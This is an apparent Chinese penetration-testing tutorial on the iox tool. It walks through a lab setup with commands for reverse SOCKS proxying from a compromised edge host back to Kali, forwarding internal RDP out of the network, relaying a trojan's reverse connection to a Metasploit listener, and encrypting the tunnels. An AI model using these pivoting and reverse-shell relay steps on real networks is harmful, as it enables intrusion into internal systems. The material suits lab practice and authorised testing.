## 0x00 iox介绍 

### What's iox？

iox是一款Go语言编写的开源端口转发&内网代理工具。虽然是两年前的了，但是我用着还是很舒服。

项目地址：https://github.com/EddieIvan01/iox

### Why iox？

1、它可以说是`ew`、`lcx`的升级版，可以实现流量转发，端口转发、`socks`隧道、`udp`流量转发、**流量加密**等功能。

2、小巧、简便、无需繁琐的配置；命令逻辑清晰简便。

## 0x02 iox proxy模式 

iox的用法是统一的，`-l/--local`意为监听本地端口；`-r/--remote`意为连接远端主机。先来试试proxy模式。

1、通过msf上传`iox`文件至边界机`ubuntu`，并添加执行权限

![](../Images/d6e6c991124abbb20981ca3e8e968103.png)

2、kali使用`iox proxy模式`开启监听

```

./iox proxy -l 9999 -l 1080#注意两个端口顺序不要错

```

![](../Images/e2fd00ad6825a46a508107a911299ebd.png)

3、边界机器ubuntu使用iox回连

```

./iox proxy -r kali_ip:9999
```

![](../Images/63e2a4eb184cb5b711d5c0bc922561af.png)

4、随后配置`proxychains.conf`文件

![](../Images/7b3dbf24fbebe6629bd4786ff93f43ea.png)

5、成功访问内网centos机器的apache服务

![](../Images/e24c09c7258bedf585491601f3ad70fe.png)

## 0x03 iox fwd模式 

### 内网3389转发到kali

思路是一样的，将内网目标机器的3389转发到kali的3389，随后kali上再将3389的流量转到别的端口上，如33890。

```


边界机上执行：./iox fwd -r <windows08>:3389 -r <kali_ip>:9999
```

![](../Images/188dcf1b6125c45438d1059328e7d223.png)

### 内网机器反向回连

目标windows2008是内网的一台机器，不能反向链接kali，通常情况下我们的套路是：挂路由传正向马上线

这次我们试试反向的，首先要知道，内网windows2008机器不能直接反连kali。但是C能直连B，B又能直连A。

![](../Images/5721d74bd05c5684c9f08b2b6e4a7532.png)

但是可以反连边界机ubuntu，所以我们先生成一个回连ubuntu4444端口的木马。

![](../Images/a9c06c86470b896b956b4901887c244a.png)

也就是说完成了下图蓝色箭头这一步

![](../Images/4a35299df4e250f80b1ce6832c2fe5f0.png)

随后既然边界机能够回连`kali`，那么我们就可以通过`ubuntu`上面的`iox`将4444端口获取的流量，转发给`kali`的`5555`

```

./iox fwd -l 4444 -r 192.168.31.84:5555
```

![](../Images/ff79546d80293fae802dd86fc562164c.png)

即完成了下图这一步

![](../Images/90fc741ca6a59a3958ab325cb4170efd.png)

接下来`kali`开启`msf`监听`5555`，上传木马至边界机，内网`windows08`下载木马运行即可回连

![](../Images/eb4830db263b11e26023afd434e6541d.png)

## 0x04 启用加密 

### fwd模式加密

我们还是把内网`windows08`的`3389`端口转发到边界机，只不过这次是加密了。

`-r`和`-l`参数需要在目标地址前加一个`*`来表示加密。

```


边界ubuntu执行：./iox fwd -r <win08>:3389 -r *<kali>:8888 -k 656565
```

![](../Images/c3584ef0832901f7f1d76813d35c0ba7.png)

### proxy模式加密

同理，这里贴一下命令。

```


./iox proxy -l *9999 -k 000102
```

## 0x05 UDP流量转发 

既然是`UDP`流量转发，那么`proxy`代理模式就肯定用不了，因为proxy默认走的`socks5`

![](../Images/3c9f343ab8d8419b402dbbf7cb2b6b0e.png)

很简单，在命令后面加个`-u`参数即可。

```


./iox fwd -l 53 -r *127.0.0.1:8888 -k 000102 -u
```

用的不是很多，了解一下即可。主要还是前面的`fwd`端口转发和`proxy`隧道代理功能。
